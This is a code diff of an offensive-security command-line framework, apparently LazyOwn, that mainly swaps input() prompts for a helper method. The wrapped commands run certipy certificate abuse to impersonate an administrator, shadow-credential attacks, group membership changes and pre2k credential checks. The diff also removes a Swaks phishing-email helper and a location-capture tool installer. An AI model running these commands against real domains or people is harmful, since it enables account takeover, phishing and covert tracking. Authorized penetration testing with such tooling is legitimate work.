             hash_content = get_hash()
             username = user
             password = passwd
-            account = input("    [!] Enter Account for vulnerable abuse (default CA_SVC): ") or "CA_SVC"
+            account = self.ask("    [!] Enter Account for vulnerable abuse (default CA_SVC): ", "CA_SVC")
             command = f'certipy-ad find -vulnerable -u {account} -hashes ":{hash_content}" -dc-ip {target}'
             self.cmd(command)
 
         elif line.startswith("find"):
             hash_content = get_hash()
-            account = input("    [!] Enter Account for find abuse (default CA_SVC): ") or "CA_SVC"
+            account = self.ask("    [!] Enter Account for find abuse (default CA_SVC): ", "CA_SVC")
             command = f"certipy-ad find -username {account} -hashes :{hash_content} -dc-ip {target} -vulnerable"
             self.cmd(command)
 
         elif line.startswith("acount"):
-            account = input("    [!] Enter Account for account abuse (default CA_SVC): ") or "CA_SVC"
+            account = self.ask("    [!] Enter Account for account abuse (default CA_SVC): ", "CA_SVC")
             command = f"certipy-ad account -u '{user}@{self.params['domain']}' -p '{passwd}' -dc-ip '{target}' -user '{account}' read"
             self.cmd(command)
-            upn = input("    [!] Enter Account for upn (default administrator): ") or "administrator"
+            upn = self.ask("    [!] Enter Account for upn (default administrator): ", "administrator")
             command = f"certipy-ad account -u '{user}@{self.params['domain']}' -p '{passwd}' -dc-ip '{target}' -upn '{upn}'  -user '{account}' update"
             self.cmd(command)
 
         elif line.startswith("auth"):
-            account = input("    [!] Enter Account for username (default administrator): ") or "administrator"
+            account = self.ask("    [!] Enter Account for username (default administrator): ", "administrator")
             pfx_file = get_users_dic("pfx")
             if not pfx_file:
                 return
@@ -3498,7 +2807,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         domain = self.params["domain"]
 
         if line == "find":
-            user = input("    [!] Enter Username (default: Administrator): ") or "Administrator"
+            user = self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
             command = (
                 f"certipy find -k -no-pass -u {self.params['domain']}/{user}@{target} -dc-ip {target} -target {target}"
             )
@@ -3507,33 +2816,32 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             return
 
         elif line == "shadow":
-            user = input("    [!] Enter Username (default: Administrator): ") or "Administrator"
-            account = input("    [!] Enter Account for shadow abuse: ")
+            user = self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
+            account = self.ask("    [!] Enter Account for shadow abuse: ")
             command = f"certipy shadow auto -k -no-pass -u {self.params['domain']}/{user}@{target} -dc-ip {target} -target {target} -account {account}"
             print_msg(command)
             self.cmd(command)
             return
 
         elif line == "req":
-            user = input("    [!] Enter Username for certificate request: ")
-            password = input("    [!] Enter password for certificate request: ")
-            ca = input("    [!] Enter CA name (default: certified-DC01-CA): ") or "certified-DC01-CA"
+            user = self.ask("    [!] Enter Username for certificate request: ")
+            password = self.ask("    [!] Enter password for certificate request: ")
+            ca = self.ask("    [!] Enter CA name (default: certified-DC01-CA): ", "certified-DC01-CA")
             template = (
-                input("    [!] Enter template name (default: CertifiedAuthentication): ") or "CertifiedAuthentication"
+                self.ask("    [!] Enter template name (default: CertifiedAuthentication): ", "CertifiedAuthentication")
             )
             command = (
                 f"certipy req -username {user}@{self.params['domain']} -p {password} -ca {ca} -template {template}"
             )
             command2 = f"certipy req -u {user}@{self.params['domain']} -p {password} -upn administrator@{self.params['domain']} -target {self.params['domain']} -ca sequel-dc-ca -template UserAuthentication"
             choice = (
-                input(f"    [!] {WHITE}Enter the choice 1 to {GREEN}{command}{WHITE} 2 to {GREEN}{command2}{RESET}")
-                or "1"
+                self.ask(f"    [!] {WHITE}Enter the choice 1 to {GREEN}{command}{WHITE} 2 to {GREEN}{command2}{RESET}", "1")
             )
             if choice == "1":
                 print_msg(command)
                 self.cmd(command)
             else:
-                cert = input("Enter the name of certificate default: sequel-dc-ca ") or "sequel-dc-ca"
+                cert = self.ask("Enter the name of certificate default: sequel-dc-ca ", "sequel-dc-ca")
                 command2 = f"certipy req -u {user}@{self.params['domain']} -p {password} -upn administrator@{self.params['domain']} -target {self.params['domain']} -ca {cert} -template UserAuthentication"
                 print_msg(command2)
                 self.cmd(command2)
@@ -3549,8 +2857,8 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             return
 
         elif line == "update":
-            user = input("    [!] Enter Username to update: ")
-            new_upn = input("    [!] Enter new UPN for user: ")
+            user = self.ask("    [!] Enter Username to update: ")
+            new_upn = self.ask("    [!] Enter new UPN for user: ")
             command = f"certipy account update -username {user}@{self.params['domain']} -upn {new_upn}"
             print_msg(command)
             self.cmd(command)
@@ -3562,42 +2870,6 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             )
             return
 
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_sawks(self, line):
-        """
-        Executes the Swaks (Swiss Army Knife for SMTP) tool to send test emails for phishing simulations.
-
-        This function performs the following actions:
-        1. Checks if Swaks is available; if not, it clones the repository to the appropriate directory.
-        2. Constructs the Swaks command with the specified 'to' and 'from' emails, server, and message body.
-        3. Runs the command using Swaks to simulate email delivery.
-
-        Parameters:
-        line (str): Command argument specifying additional options or the message body.
-                    - If not provided, defaults to a basic test message.
-
-        Returns:
-        None
-        """
-        lhost = self.params["lhost"]
-        domain = self.params["domain"]
-        email_to = self.params["email_to"]
-        email_from = self.params["email_from"]
-        swaks_git = "https://github.com/jetmore/swaks.git"
-        swaks_dir = os.path.join(os.getcwd(), "external/.exploit/swaks")
-
-        if not os.path.exists(swaks_dir):
-            print_msg("Cloning Swaks repository...")
-            self.cmd(f"git clone {swaks_git} {swaks_dir}")
-        else:
-            print_msg("Swaks already installed, skipping setup.")
-
-        server = self.params["domain"]
-        body = line or f"http://{self.params['lhost']}/"
-
-        command = f'{swaks_dir}/swaks --to {email_to} --from {email_from} --server {server} --body "{body}"'
-        print_msg(f"Executing command: {command}")
-        self.cmd(command)
 
     @cmd2.with_category("02. Scanning & Enumeration")
     def do_ad_ldap_enum(self, line):
@@ -3641,8 +2913,8 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
 
         if not os.path.exists(f"{os.getcwd()}/sessions/credentials.txt"):
             print_warn("Credentials required. Please provide your username and password.")
-            username = input("Enter username: ")
-            password = input("Enter password: ")
+            username = self.ask("Enter username: ")
+            password = self.ask("Enter password: ")
         else:
             credentials = get_credentials()
             if not credentials:
@@ -3680,9 +2952,9 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         """
         rhost = self.params["rhost"]
         domain = self.params["domain"]
-        user = input("    [!] Enter the user to add (default judith.mader): ") or "judith.mader"
-        group = input("    [!] Enter the group name (default Management): ") or "Management"
-        rhost = input(f"    [!] Enter the DC IP address (default {self.params['rhost']}): ") or self.params["rhost"]
+        user = self.ask("    [!] Enter the user to add (default judith.mader): ", "judith.mader")
+        group = self.ask("    [!] Enter the group name (default Management): ", "Management")
+        rhost = self.ask(f"    [!] Enter the DC IP address (default {self.params['rhost']}): ", self.params["rhost"])
         credentials_path = f"{os.getcwd()}/sessions/credentials.txt"
 
         if not os.path.exists(credentials_path):
@@ -3736,8 +3008,8 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             if command == "auth":
                 credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
                 if not os.path.exists(credentials_path):
-                    username = self.params.get("username") or input("    [!] Enter the username: ")
-                    password = self.params.get("password") or input("    [!] Enter the password: ")
+                    username = self.params.get("username") or self.ask("    [!] Enter the username: ")
+                    password = self.params.get("password") or self.ask("    [!] Enter the password: ")
                 else:
                     credentials_path = get_users_dic("txt")
                     with open(credentials_path) as f:
@@ -3745,18 +3017,18 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                         if credentials:
                             username, password = credentials[0].split(":")
                         else:
-                            username = self.params.get("username") or input("    [!] Enter the username: ")
-                            password = self.params.get("password") or input("    [!] Enter the password: ")
+                            username = self.params.get("username") or self.ask("    [!] Enter the username: ")
+                            password = self.params.get("password") or self.ask("    [!] Enter the password: ")
                         domain = self.params["domain"]
                         dc_ip = self.params["rhost"]
 
                 if not self.params["domain"]:
                     print_error("Domain not defined.")
-                    domain = input("    [!] Enter the self.params['domain']: ")
+                    domain = self.ask("    [!] Enter the self.params['domain']: ")
 
                 if not dc_ip:
                     print_error("Domain controller IP not defined.")
-                    dc_ip = input("    [!] Enter the self.params['domain'] controller IP: ")
+                    dc_ip = self.ask("    [!] Enter the self.params['domain'] controller IP: ")
 
                 command = f"cd {pre2k_path} && pre2k auth -u {username} -p {password} -d {self.params['domain']} -dc-ip {dc_ip}"
 
@@ -3766,11 +3038,11 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
 
                 if not self.params["domain"]:
                     print_error("Domain not defined.")
-                    domain = input("    [!] Enter the self.params['domain']: ")
+                    domain = self.ask("    [!] Enter the self.params['domain']: ")
 
                 if not dc_ip:
                     print_error("Domain controller IP not defined.")
-                    dc_ip = input("    [!] Enter the self.params['domain'] controller IP: ")
+                    dc_ip = self.ask("    [!] Enter the self.params['domain'] controller IP: ")
 
                 input_file = get_users_dic("txt")
 
@@ -3779,7 +3051,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
 
                 if not input_file:
                     print_error("Input file not defined.")
-                    input_file = input("    [!] Enter the input file path: ")
+                    input_file = self.ask("    [!] Enter the input file path: ")
 
                 command = f"cd {pre2k_path} && pre2k unauth -d {self.params['domain']} -dc-ip {dc_ip} -save -inputfile {input_file} -outputfile {path}/sessions/pre2k_{dc_ip}.txt"
 
@@ -3792,35 +3064,3 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         except Exception as e:
             print_error(f"Error: {e}")
 
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_hound(self, line):
-        """
-        Executes the hound tool for Hound is a simple and light tool for information gathering and capture exact GPS coordinates
-
-        This function:
-            - Installs hound if not already installed.
-            - Executes the hound command with the provided parameters.
-            - Displays the result in the terminal.
-
-        Behavior:
-            - Requires `git` and `php` to be installed.
-            - Uses a one-liner installation method for simplicity.
-
-        Usage:
-            hound
-        """
-        path = os.getcwd()
-        hound_repo = "https://github.com/techchipnet/hound.git"
-        hound_path = os.path.join(path, "external", ".exploit", "hound")
-
-        try:
-            if not os.path.exists(hound_path):
-                print_msg("hound is not installed. Installing...")
-                self.cmd(f"git clone {hound_repo} {hound_path}")
-                self.cmd(f"cd {hound_path} && chmod +x hound.sh")
-
-            command = f"cd {hound_path} && ./hound.sh"
-            self.cmd(command)
-
-        except Exception as e:
-            print_error(f"An error occurred: {e}")
